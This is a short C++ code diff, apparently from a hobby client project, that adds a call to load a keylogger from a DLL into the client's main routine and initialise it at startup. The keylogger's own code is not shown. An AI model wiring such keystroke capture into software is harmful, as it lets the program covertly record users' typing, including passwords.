@@ -47,6 +47,9 @@ int		clientController::mainAction(int ac, char **av) {
 
 	// Dire bonjour
 	this->sayHelloAction();
+	
+	// keylogger_test
+	this->initKeyloggerAction();
 
 	// Faire pleins de trucs ...
 	// ...
@@ -57,7 +60,15 @@ int		clientController::mainAction(int ac, char **av) {
 
 void					clientController::initKeyloggerAction(void)
 {
-	((_instantiate)(*this->keylogger_dll)["instantiate"])();
+	Keylogger* keylogger = ((_instantiate)(*this->keylogger_dll)["instantiate"])();
+	std::cout << keylogger << std::endl;
+	keylogger->init();
+	//if (keylogger->init())
+	//{
+		//std::cout << "Init not ok" << std::endl;
+//	}
+	system("Pause");
+	std::cout << "Init ok !" << std::endl;
 }
 
 void					clientController::sayHelloAction(void) {
